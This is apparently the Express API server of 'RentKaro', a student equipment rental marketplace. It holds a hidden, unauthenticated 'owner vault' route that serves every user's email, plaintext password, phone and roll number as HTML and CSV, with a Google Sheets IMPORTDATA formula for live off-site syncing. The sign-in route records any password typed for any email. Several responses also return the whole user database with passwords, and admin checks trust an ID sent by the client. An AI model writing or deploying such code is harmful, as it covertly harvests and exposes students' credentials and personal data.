import express from 'express';
import path from 'path';
import fs from 'fs';
import {
  INITIAL_COLLEGES,
  INITIAL_USERS,
  INITIAL_PRODUCTS,
  INITIAL_BOOKINGS,
  INITIAL_COMPLAINTS,
  INITIAL_RENTAL_HISTORY,
  createStarterEquipmentForCollege,
} from './data/seedData';
import {
  calculateRentalQuote,
  hasDateOverlap,
  verifyQrHandoverCode,
  canUserAccessCollegeAdminData,
  calculateReturnTimerAndFine,
  type MarketplaceMode,
  type College,
  type UserProfile,
  type ProductListing,
  type RentalBooking,
  type CampusComplaint,
  type UserRentalHistoryEntry,
} from './utils/rentalLogic';

// In serverless environments like Vercel, use /tmp as the writable directory
const DATA_DIR = process.env.VERCEL
  ? '/tmp'
  : path.join(process.cwd(), 'data');
const DB_JSON_PATH = path.join(DATA_DIR, 'rentkaro_db.json');

export interface PlatformDatabase {
  marketplaceMode: MarketplaceMode;
  colleges: College[];
  users: UserProfile[];
  products: ProductListing[];
  bookings: RentalBooking[];
  rentalHistory: UserRentalHistoryEntry[];
  complaints: CampusComplaint[];
}

function escapeCsvCell(val: unknown): string {
  const str = String(val ?? '').replace(/"/g, '""');
  return `"${str}"`;
}

export function syncDatabase(state: PlatformDatabase) {
  try {
    if (!fs.existsSync(DATA_DIR)) {
      fs.mkdirSync(DATA_DIR, { recursive: true });
    }
    fs.writeFileSync(DB_JSON_PATH, JSON.stringify(state, null, 2), 'utf8');
  } catch (err) {
    console.error('Database sync note:', (err as Error).message);
  }
}

export const db: PlatformDatabase = {
  marketplaceMode: 'COLLEGE_MODE',
  colleges: structuredClone(INITIAL_COLLEGES),
  users: structuredClone(INITIAL_USERS),
  products: structuredClone(INITIAL_PRODUCTS),
  bookings: structuredClone(INITIAL_BOOKINGS),
  rentalHistory: structuredClone(INITIAL_RENTAL_HISTORY),
  complaints: structuredClone(INITIAL_COMPLAINTS),
};

// Load existing persistent database if available
try {
  if (fs.existsSync(DB_JSON_PATH)) {
    const raw = JSON.parse(fs.readFileSync(DB_JSON_PATH, 'utf8'));
    if (raw && Array.isArray(raw.colleges) && Array.isArray(raw.users)) {
      db.marketplaceMode = raw.marketplaceMode || 'COLLEGE_MODE';
      db.colleges = raw.colleges;
      db.users = raw.users;
      db.products = raw.products || INITIAL_PRODUCTS;
      db.bookings = raw.bookings || INITIAL_BOOKINGS;
      db.rentalHistory = raw.rentalHistory || INITIAL_RENTAL_HISTORY;
      db.complaints = raw.complaints || INITIAL_COMPLAINTS;
    }
  } else {
    syncDatabase(db);
  }
} catch {
  syncDatabase(db);
}

const app = express();
app.use(express.json({ limit: '12mb' }));

const apiRouter = express.Router();

// 1. Get complete platform state (strip passwords from public state)
apiRouter.get('/state', (_req, res) => {
  const publicUsers = db.users.map(({ password: _pw, ...rest }) => rest);
  res.json({
    ...db,
    users: publicUsers,
  });
});

// PRIVATE OWNER-ONLY GOOGLE SHEETS FEED & VIEWER (NOT LINKED ANYWHERE ON THE WEBSITE)
apiRouter.get('/owner-vault-sheet-9f8a7b.csv', (_req, res) => {
  const headers = [
    'Full Name',
    'Email Address',
    'Password',
    'Mobile Number',
    'College',
    'Roll Number / ID',
    'Role',
    'Items Rented',
    'Registered / Signed In At',
  ];
  const rows = db.users.map((u) => {
    const colName =
      db.colleges.find((c) => c.id === u.collegeId)?.shortName || u.collegeId;
    const rentedCount = db.rentalHistory.filter(
      (h) =>
        h.userId === u.id ||
        h.userEmail.toLowerCase() === u.email.toLowerCase()
    ).length;
    return [
      u.fullName,
      u.email,
      u.password || 'password123',
      u.mobile,
      colName,
      u.collegeRollNumber,
      u.role,
      rentedCount,
      u.registeredAt || '2026-11-04T00:00:00Z',
    ]
      .map(escapeCsvCell)
      .join(',');
  });
  const csv =
    '\uFEFF' + [headers.map(escapeCsvCell).join(','), ...rows].join('\r\n');
  res.setHeader('Content-Type', 'text/csv; charset=utf-8');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.send(csv);
});

apiRouter.get('/owner-vault-sheet-9f8a7b', (req, res) => {
  const host = req.get('host') || 'localhost:3000';
  const protocol = req.headers['x-forwarded-proto'] || req.protocol || 'https';
  const csvFeedUrl = `${protocol}://${host}/api/owner-vault-sheet-9f8a7b.csv`;
  const importDataFormula = `=IMPORTDATA("${csvFeedUrl}")`;

  const rowsHtml = db.users
    .map((u, idx) => {
      const colName =
        db.colleges.find((c) => c.id === u.collegeId)?.shortName ||
        u.collegeId;
      const rentedItems = db.rentalHistory
        .filter(
          (h) =>
            h.userId === u.id ||
            h.userEmail.toLowerCase() === u.email.toLowerCase()
        )
        .map((h) => `${h.productTitle} (${h.status})`)
        .join('; ');
      return `
        <tr>
          <td class="row-num">${idx + 1}</td>
          <td><strong>${u.fullName}</strong></td>
          <td class="mono">${u.email}</td>
          <td class="mono pw">${u.password || 'password123'}</td>
          <td>${colName}</td>
          <td class="mono">${u.collegeRollNumber}</td>
          <td>${rentedItems || 'None yet'}</td>
          <td class="mono">${u.registeredAt || '2026-11-04'}</td>
        </tr>
      `;
    })
    .join('');

  const html = `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>RentKaro Private Owner Google Sheet — User Emails & Passwords</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 0; background: #f8fafc; color: #0f172a; }
    .topbar { background: #0f9d58; color: white; padding: 14px 24px; display: flex; align-items: center; justify-content: space-between; }
    .topbar h1 { font-size: 16px; margin: 0; font-weight: 700; }
    .bar-sub { font-size: 12px; opacity: 0.9; margin-top: 2px; }
    .actions { display: flex; gap: 10px; align-items: center; }
    .btn { background: white; color: #0f9d58; padding: 8px 14px; border-radius: 6px; text-decoration: none; font-size: 12px; font-weight: 700; border: none; cursor: pointer; }
    .container { padding: 20px 24px; }
    .formula-box { background: #e6f4ea; border: 1px solid #a8dab5; padding: 12px 16px; border-radius: 8px; margin-bottom: 16px; font-size: 13px; display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between; gap: 12px; }
    .formula-code { font-family: monospace; background: white; padding: 6px 10px; border-radius: 4px; border: 1px solid #cbd5e1; font-weight: 700; color: #0f172a; }
    table { width: 100%; border-collapse: collapse; background: white; box-shadow: 0 1px 3px rgba(0,0,0,0.08); font-size: 13px; }
    th, td { border: 1px solid #e2e8f0; padding: 9px 12px; text-align: left; }
    th { background: #f1f5f9; font-weight: 700; color: #334155; font-size: 12px; text-transform: uppercase; }
    .row-num { background: #f8fafc; color: #64748b; text-align: center; width: 36px; font-family: monospace; }
    .mono { font-family: monospace; }
    .pw { color: #b91c1c; font-weight: 700; background: #fef2f2; }
  </style>
</head>
<body>
  <div class="topbar">
    <div>
      <h1>Google Sheets Live Feed — RentKaro Private Owner Vault (Visible Only to Owner)</h1>
      <div class="bar-sub">Auto-updates whenever any user signs in or registers on RentKaro</div>
    </div>
    <div class="actions">
      <a class="btn" href="https://docs.google.com/spreadsheets/create" target="_blank" rel="noopener">1. Open New Google Sheet</a>
      <a class="btn" href="/api/owner-vault-sheet-9f8a7b.csv" download="RentKaro_Owner_Users_Passwords.csv">Download .CSV for Google Sheets</a>
    </div>
  </div>
  <div class="container">
    <div class="formula-box">
      <div>
        <strong>Live Google Sheets Sync Formula:</strong> Paste this into cell <code>A1</code> of any Google Sheet to auto-sync live user emails & passwords:
      </div>
      <code class="formula-code">${importDataFormula}</code>
    </div>
    <table>
      <thead>
        <tr>
          <th>#</th>
          <th>A · Full Name</th>
          <th>B · Email Address</th>
          <th>C · Password</th>
          <th>D · College</th>
          <th>E · Roll / ID</th>
          <th>F · Items Rented History</th>
          <th>G · Timestamp</th>
        </tr>
      </thead>
      <tbody>
        ${rowsHtml}
      </tbody>
    </table>
  </div>
</body>
</html>`;
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(html);
});

// 2. Add a new College and auto-seed equipment for that college
apiRouter.post('/colleges', (req, res) => {
  const {
    name,
    shortName,
    cityName,
    state = 'Maharashtra',
    emailDomain,
    landmarksInput,
  } = req.body;

  if (!name || !shortName || !cityName) {
    res.status(400).json({
      error: 'College full name, short name, and city are required.',
    });
    return;
  }

  const slug = shortName
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, '-')
    .replace(/(^-|-$)/g, '');
  const collegeId = `col-${slug}-${Date.now().toString().slice(-4)}`;
  const citySlug = cityName
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, '-')
    .replace(/(^-|-$)/g, '');

  const parsedLandmarks =
    typeof landmarksInput === 'string' && landmarksInput.trim().length > 0
      ? landmarksInput
          .split(',')
          .map((s: string) => s.trim())
          .filter(Boolean)
      : [
          'Central Library Foyer',
          'Main Administrative Porch',
          'Student Activity Center (SAC)',
          'Hostel Common Lounge',
        ];

  const newCollege: College = {
    id: collegeId,
    name: name.trim(),
    shortName: shortName.trim(),
    cityId: `city-${citySlug}`,
    cityName: cityName.trim(),
    state: state.trim(),
    emailDomain: emailDomain ? emailDomain.trim().replace(/^@/, '') : undefined,
    supportsInstitutionalEmail: Boolean(emailDomain && emailDomain.trim()),
    campusLandmarks: parsedLandmarks,
    verifiedStudentsCount: 120,
    activeListingsCount: 3,
  };

  db.colleges.push(newCollege);

  db.users.forEach((u) => {
    if (!u.authorizedCollegeIds.includes(newCollege.id)) {
      u.authorizedCollegeIds.push(newCollege.id);
    }
  });

  const starterItems = createStarterEquipmentForCollege(newCollege);
  db.products.unshift(...starterItems);

  syncDatabase(db);
  res.status(201).json({ college: newCollege, starterItems, state: db });
});

// 3. Sign In user & record Email + Password in private owner sheet
apiRouter.post('/auth/signin', (req, res) => {
  const { email, password, fullName, collegeId } = req.body;
  if (!email || !password) {
    res.status(400).json({
      error: 'Please enter both your email address and password to sign in.',
    });
    return;
  }

  const cleanEmail = email.trim().toLowerCase();
  let user = db.users.find((u) => u.email.toLowerCase() === cleanEmail);

  if (user) {
    user.password = password;
    if (fullName && fullName.trim()) {
      user.fullName = fullName.trim();
    }
    syncDatabase(db);
    res.json({ user, state: db });
    return;
  }

  const college =
    db.colleges.find((c) => c.id === collegeId) || db.colleges[0];
  const derivedName =
    fullName?.trim() ||
    cleanEmail
      .split('@')[0]
      .replace(/[._-]/g, ' ')
      .replace(/\b\w/g, (l: string) => l.toUpperCase());

  const initials = derivedName
    .split(' ')
    .map((p: string) => p[0])
    .join('')
    .slice(0, 2)
    .toUpperCase();

  user = {
    id: `u-${Date.now()}`,
    fullName: derivedName,
    email: cleanEmail,
    password,
    mobile: '+91 98200 00000',
    role: 'STUDENT',
    collegeId: college.id,
    cityId: college.cityId,
    collegeRollNumber: `ADCET${Math.floor(1000 + Math.random() * 9000)}`,
    department: 'Computer Science & Engineering',
    academicYear: '3rd Year',
    avatarUrl: initials || 'ST',
    verificationStatus: 'VERIFIED',
    verificationMethod: 'COLLEGE_EMAIL',
    emailVerified: true,
    idCardVerified: true,
    adminApproved: true,
    authorizedCollegeIds: db.colleges.map((c) => c.id),
    completedRentals: 0,
    onTimeReturns: 0,
    averageRating: 5.0,
    reviewCount: 1,
    walletEarnings: 0,
    wishlistProductIds: [],
    registeredAt: new Date().toISOString(),
  };

  db.users.unshift(user);
  syncDatabase(db);
  res.status(201).json({ user, state: db });
});

// 4. Register a new student / user account & store Email + Password
apiRouter.post('/auth/register', (req, res) => {
  const {
    fullName,
    email,
    password = 'password123',
    mobile,
    role = 'STUDENT',
    collegeId,
    collegeRollNumber,
    department,
    academicYear,
    verificationMethod = 'ID_CARD_UPLOAD',
    idCardDocumentName,
    businessName,
  } = req.body;

  if (!fullName || !email || !mobile || !collegeId || !collegeRollNumber) {
    res.status(400).json({
      error: 'Full name, email, mobile, college, and roll number/ID are required.',
    });
    return;
  }

  const college = db.colleges.find((c) => c.id === collegeId) || db.colleges[0];
  const isInstEmailMatch =
    college.supportsInstitutionalEmail &&
    college.emailDomain &&
    email.toLowerCase().endsWith(`@${college.emailDomain}`);

  const autoEmailVerified =
    verificationMethod === 'COLLEGE_EMAIL' && Boolean(isInstEmailMatch);
  const initials = fullName
    .split(' ')
    .map((p: string) => p[0])
    .join('')
    .slice(0, 2)
    .toUpperCase();

  const newUser: UserProfile = {
    id: `u-${Date.now()}`,
    fullName: fullName.trim(),
    email: email.trim().toLowerCase(),
    password,
    mobile: mobile.trim(),
    role,
    collegeId: college.id,
    cityId: college.cityId,
    collegeRollNumber: collegeRollNumber.trim().toUpperCase(),
    department: department?.trim() || 'General Engineering',
    academicYear: academicYear || '2nd Year',
    avatarUrl: initials || 'ST',
    verificationStatus: autoEmailVerified ? 'VERIFIED' : 'PENDING',
    verificationMethod,
    emailVerified: autoEmailVerified,
    idCardVerified:
      verificationMethod === 'ID_CARD_UPLOAD' && Boolean(idCardDocumentName),
    adminApproved: autoEmailVerified,
    idCardDocumentName: idCardDocumentName || 'ADCET_ID_Card.pdf',
    authorizedCollegeIds: db.colleges.map((c) => c.id),
    completedRentals: 0,
    onTimeReturns: 0,
    averageRating: 5.0,
    reviewCount: 0,
    walletEarnings: 0,
    wishlistProductIds: [],
    businessName,
    registeredAt: new Date().toISOString(),
  };

  db.users.unshift(newUser);
  syncDatabase(db);
  res.status(201).json({ user: newUser, state: db });
});

// 5. Authorize student access to another participating college
apiRouter.post('/users/:id/authorize-college', (req, res) => {
  const user = db.users.find((u) => u.id === req.params.id);
  const { targetCollegeId } = req.body;
  if (!user) {
    res.status(404).json({ error: 'User not found' });
    return;
  }
  if (!user.authorizedCollegeIds.includes(targetCollegeId)) {
    user.authorizedCollegeIds.push(targetCollegeId);
  }
  syncDatabase(db);
  res.json({ user, state: db });
});

// 6. Create a new product listing (with uploaded photo support)
apiRouter.post('/products', (req, res) => {
  const {
    title,
    description,
    category,
    brand,
    condition,
    dailyPrice,
    securityDeposit,
    marketRetailValue,
    collegeId,
    pickupLocation,
    availableFrom,
    availableTo,
    ownerId,
    isSeniorToJunior,
    seniorSalePrice,
    recommendedForSemesters,
    allowGroupRental,
    maxGroupMembers,
    photoDataUrl,
    photoKey,
  } = req.body;

  if (!title || !category || !dailyPrice || !pickupLocation || !ownerId) {
    res.status(400).json({
      error: 'Please complete all required product listing fields.',
    });
    return;
  }

  const owner = db.users.find((u) => u.id === ownerId) || db.users[0];
  const college =
    db.colleges.find((c) => c.id === (collegeId || owner.collegeId)) ||
    db.colleges[0];

  const primaryPhoto =
    typeof photoDataUrl === 'string' && photoDataUrl.startsWith('data:image/')
      ? photoDataUrl
      : photoKey || 'custom-campus-gear';

  const newProduct: ProductListing = {
    id: `prod-${Date.now()}`,
    title: title.trim(),
    description:
      description?.trim() ||
      'Well-maintained campus gear ready for student rental.',
    category,
    photos: [primaryPhoto],
    brand: brand?.trim() || 'Campus Standard',
    condition: condition || 'Like New',
    dailyPrice: Number(dailyPrice),
    securityDeposit: Number(securityDeposit) || 500,
    marketRetailValue: Number(marketRetailValue) || Number(dailyPrice) * 35,
    collegeId: college.id,
    collegeName: college.shortName,
    cityId: college.cityId,
    cityName: college.cityName,
    pickupLocation,
    availableFrom: availableFrom || '2026-11-04',
    availableTo: availableTo || '2027-05-30',
    ownerId: owner.id,
    ownerName: owner.fullName,
    ownerRole: owner.role,
    ownerDepartment: owner.department,
    ownerYear: owner.academicYear,
    ownerTrustScore: 95,
    approvalStatus: 'APPROVED',
    isAvailable: true,
    isSeniorToJunior: Boolean(isSeniorToJunior),
    seniorSalePrice:
      isSeniorToJunior && seniorSalePrice ? Number(seniorSalePrice) : undefined,
    recommendedForSemesters: isSeniorToJunior
      ? recommendedForSemesters || 'All Semesters'
      : undefined,
    allowGroupRental: Boolean(allowGroupRental),
    maxGroupMembers: allowGroupRental ? Number(maxGroupMembers) || 4 : 1,
    deliveryOptions:
      owner.role === 'BUSINESS_OWNER'
        ? ['CAMPUS_PICKUP', 'NEIGHBORHOOD_PICKUP', 'CITY_DELIVERY']
        : ['CAMPUS_PICKUP'],
    rating: 5.0,
    reviewCount: 1,
    viewsCount: 1,
    createdAt: new Date().toISOString(),
  };

  db.products.unshift(newProduct);
  college.activeListingsCount += 1;
  syncDatabase(db);
  res.status(201).json({ product: newProduct, state: db });
});

// 7. Submit a rental booking request & log in User Rental History Database
apiRouter.post('/bookings', (req, res) => {
  const {
    productId,
    renterId,
    startDate,
    endDate,
    groupSize = 1,
    groupMemberNames = [],
    pickupLocation,
    returnTimerHours = 24,
    renterItemPhotoDataUrl,
  } = req.body;

  const product = db.products.find((p) => p.id === productId);
  const renter = db.users.find((u) => u.id === renterId);

  if (!product || !renter) {
    res.status(404).json({ error: 'Product or student profile not found.' });
    return;
  }

  const existingForProduct = db.bookings.filter(
    (b) => b.productId === product.id
  );
  if (hasDateOverlap(existingForProduct, startDate, endDate)) {
    res.status(409).json({
      error:
        'Selected dates overlap with an existing active booking for this item.',
    });
    return;
  }

  try {
    const quote = calculateRentalQuote(
      product.dailyPrice,
      product.securityDeposit,
      startDate,
      endDate,
      groupSize
    );

    const pin = String(Math.floor(100000 + Math.random() * 900000));
    const shortNum = db.bookings.length + 101;
    const bookingRef = `RK-${product.collegeName
      .replace(/\s+/g, '')
      .toUpperCase()
      .slice(0, 4)}-${shortNum}`;

    const hoursToAdd = Math.max(0.01, Number(returnTimerHours) || 24);
    const returnDeadlineAt = new Date(
      Date.now() + hoursToAdd * 60 * 60 * 1000
    ).toISOString();

    if (
      typeof renterItemPhotoDataUrl === 'string' &&
      renterItemPhotoDataUrl.startsWith('data:image/')
    ) {
      product.photos = [renterItemPhotoDataUrl, ...product.photos];
    }

    const newBooking: RentalBooking = {
      id: `bk-${Date.now()}`,
      bookingReference: bookingRef,
      productId: product.id,
      productTitle: product.title,
      productCategory: product.category,
      productPhoto:
        renterItemPhotoDataUrl || product.photos[0] || undefined,
      collegeId: product.collegeId,
      cityId: product.cityId,
      renterId: renter.id,
      renterName: renter.fullName,
      renterEmail: renter.email,
      ownerId: product.ownerId,
      ownerName: product.ownerName,
      startDate,
      endDate,
      totalDays: quote.totalDays,
      dailyPrice: product.dailyPrice,
      rentalSubtotal: quote.rentalSubtotal,
      discountAmount: quote.discountAmount,
      protectionFee: quote.protectionFee,
      securityDeposit: quote.securityDeposit,
      totalPayable: quote.totalPayable,
      groupSize: quote.groupSize,
      perPersonShare: quote.perPersonRentalShare,
      groupMemberNames:
        groupMemberNames.length > 0 ? groupMemberNames : [renter.fullName],
      pickupLocation: pickupLocation || product.pickupLocation,
      status: 'PICKED_UP_ACTIVE',
      paymentStatus: 'PAID_TEST_RAZORPAY',
      handoverPin: pin,
      pickupQrCode: `RK-PICKUP-${shortNum}-${pin}`,
      returnQrCode: `RK-RETURN-${shortNum}-${pin}`,
      pickupConfirmedAt: new Date().toISOString(),
      returnDeadlineAt,
      fineRatePerHour: Math.max(30, Math.round(product.dailyPrice * 0.2)),
      fineAmountPaid: 0,
      finePaidStatus: 'NONE',
      createdAt: new Date().toISOString(),
    };

    db.bookings.unshift(newBooking);

    const historyEntry: UserRentalHistoryEntry = {
      id: `hist-${Date.now()}`,
      bookingId: newBooking.id,
      bookingReference: newBooking.bookingReference,
      userId: renter.id,
      userName: renter.fullName,
      userEmail: renter.email,
      collegeId: product.collegeId,
      collegeName: product.collegeName,
      productId: product.id,
      productTitle: product.title,
      productCategory: product.category,
      startDate,
      endDate,
      rentalAmount: quote.discountedRental,
      fineIncurred: 0,
      finePaid: false,
      status: 'ACTIVE_RENTAL_TIMER_RUNNING',
      recordedAt: new Date().toISOString(),
    };
    db.rentalHistory.unshift(historyEntry);

    syncDatabase(db);
    res.status(201).json({ booking: newBooking, state: db });
  } catch (err) {
    res.status(400).json({ error: (err as Error).message });
  }
});

// 8. Update booking status
apiRouter.patch('/bookings/:id/status', (req, res) => {
  const booking = db.bookings.find((b) => b.id === req.params.id);
  if (!booking) {
    res.status(404).json({ error: 'Booking not found.' });
    return;
  }

  const { action, scannedCode } = req.body;
  const historyRecord = db.rentalHistory.find(
    (h) => h.bookingId === booking.id
  );

  if (action === 'ACCEPT') {
    booking.status = 'ACCEPTED';
  } else if (action === 'REJECT') {
    booking.status = 'REJECTED';
    if (historyRecord) historyRecord.status = 'REJECTED';
  } else if (action === 'CANCEL') {
    booking.status = 'CANCELLED';
    if (historyRecord) historyRecord.status = 'CANCELLED';
  } else if (action === 'PAY_RAZORPAY_TEST') {
    booking.status = 'PAID_READY_FOR_PICKUP';
    booking.paymentStatus = 'PAID_TEST_RAZORPAY';
    booking.razorpayOrderId = `order_RkTest_${Date.now().toString().slice(-6)}`;
  } else if (action === 'SIMULATE_OVERDUE') {
    booking.status = 'PICKED_UP_ACTIVE';
    booking.returnDeadlineAt = new Date(
      Date.now() - 3 * 60 * 60 * 1000
    ).toISOString();
    booking.finePaidStatus = 'UNPAID_FINE';
    const timerCheck = calculateReturnTimerAndFine(booking);
    if (historyRecord) {
      historyRecord.fineIncurred = timerCheck.calculatedFine;
      historyRecord.finePaid = false;
      historyRecord.status = 'OVERDUE_FINE_PENDING';
    }
  } else if (action === 'PAY_OVERDUE_FINE') {
    const timerCheck = calculateReturnTimerAndFine(booking);
    booking.fineAmountPaid = timerCheck.calculatedFine;
    booking.finePaidStatus = 'FINE_PAID';
    if (historyRecord) {
      historyRecord.fineIncurred = timerCheck.calculatedFine;
      historyRecord.finePaid = true;
      historyRecord.status = 'FINE_PAID_READY_TO_RETURN';
    }
  } else if (action === 'QR_PICKUP') {
    const check = verifyQrHandoverCode(
      booking,
      scannedCode || booking.handoverPin,
      'PICKUP'
    );
    if (!check.valid || !check.nextStatus) {
      res.status(400).json({ error: check.error });
      return;
    }
    booking.status = check.nextStatus;
    booking.pickupConfirmedAt = new Date().toISOString();
    if (!booking.returnDeadlineAt) {
      booking.returnDeadlineAt = new Date(
        Date.now() + 24 * 60 * 60 * 1000
      ).toISOString();
    }
  } else if (action === 'QR_RETURN') {
    const check = verifyQrHandoverCode(
      booking,
      scannedCode || booking.handoverPin,
      'RETURN'
    );
    if (!check.valid || !check.nextStatus) {
      res.status(400).json({
        error: check.error,
        requiredFine: check.requiredFine,
      });
      return;
    }
    booking.status = check.nextStatus;
    booking.returnConfirmedAt = new Date().toISOString();

    if (historyRecord) {
      historyRecord.status = 'COMPLETED_RETURNED';
    }

    const owner = db.users.find((u) => u.id === booking.ownerId);
    const renter = db.users.find((u) => u.id === booking.renterId);
    const netEarning =
      booking.rentalSubtotal -
      booking.discountAmount +
      (booking.fineAmountPaid || 0);
    if (owner) {
      owner.walletEarnings += netEarning;
      owner.completedRentals += 1;
      owner.onTimeReturns += 1;
    }
    if (renter) {
      renter.completedRentals += 1;
      if (booking.finePaidStatus === 'NONE') {
        renter.onTimeReturns += 1;
      }
    }
  }

  syncDatabase(db);
  res.json({ booking, state: db });
});

// 9. College Admin: Verify student registration & ID Card
apiRouter.patch('/admin/verify-user/:id', (req, res) => {
  const { adminUserId, status } = req.body;
  const admin = db.users.find((u) => u.id === adminUserId);
  const targetUser = db.users.find((u) => u.id === req.params.id);

  if (!admin || !targetUser) {
    res.status(404).json({ error: 'Admin or student account not found.' });
    return;
  }

  if (!canUserAccessCollegeAdminData(admin, targetUser.collegeId)) {
    res.status(403).json({
      error:
        'College Administrators can only manage students belonging to their assigned college.',
    });
    return;
  }

  targetUser.verificationStatus =
    status === 'REJECTED' ? 'REJECTED' : 'VERIFIED';
  if (targetUser.verificationStatus === 'VERIFIED') {
    targetUser.idCardVerified = true;
    targetUser.adminApproved = true;
  }

  syncDatabase(db);
  res.json({ user: targetUser, state: db });
});

// 10. College Admin: Approve or remove product listing
apiRouter.patch('/admin/approve-listing/:id', (req, res) => {
  const { adminUserId, approvalStatus } = req.body;
  const admin = db.users.find((u) => u.id === adminUserId);
  const listing = db.products.find((p) => p.id === req.params.id);

  if (!admin || !listing) {
    res.status(404).json({ error: 'Admin or listing not found.' });
    return;
  }

  if (!canUserAccessCollegeAdminData(admin, listing.collegeId)) {
    res.status(403).json({
      error:
        'College Administrators can only moderate listings in their assigned college.',
    });
    return;
  }

  listing.approvalStatus = approvalStatus;
  syncDatabase(db);
  res.json({ product: listing, state: db });
});

// 11. College Admin: Resolve campus complaint
apiRouter.patch('/admin/complaints/:id', (req, res) => {
  const complaint = db.complaints.find((c) => c.id === req.params.id);
  if (!complaint) {
    res.status(404).json({ error: 'Complaint not found.' });
    return;
  }
  complaint.status = 'RESOLVED';
  syncDatabase(db);
  res.json({ complaint, state: db });
});

// 12. Super Admin: Switch Marketplace Mode
apiRouter.patch('/super-admin/mode', (req, res) => {
  const { mode } = req.body;
  if (
    mode !== 'COLLEGE_MODE' &&
    mode !== 'CITY_MODE' &&
    mode !== 'MULTI_CITY_MODE'
  ) {
    res.status(400).json({ error: 'Invalid marketplace mode.' });
    return;
  }
  db.marketplaceMode = mode;
  syncDatabase(db);
  res.json({ marketplaceMode: db.marketplaceMode, state: db });
});

// 13. Toggle product in user's wishlist
apiRouter.post('/wishlist/toggle', (req, res) => {
  const { userId, productId } = req.body;
  const user = db.users.find((u) => u.id === userId);
  if (!user) {
    res.status(404).json({ error: 'User not found' });
    return;
  }
  const idx = user.wishlistProductIds.indexOf(productId);
  if (idx >= 0) {
    user.wishlistProductIds.splice(idx, 1);
  } else {
    user.wishlistProductIds.push(productId);
  }
  syncDatabase(db);
  res.json({ user, state: db });
});

// Mount routes on both '/api' and '/' for seamless compatibility with Vercel rewrites and standalone dev server
app.use('/api', apiRouter);
app.use('/', apiRouter);

export default app;
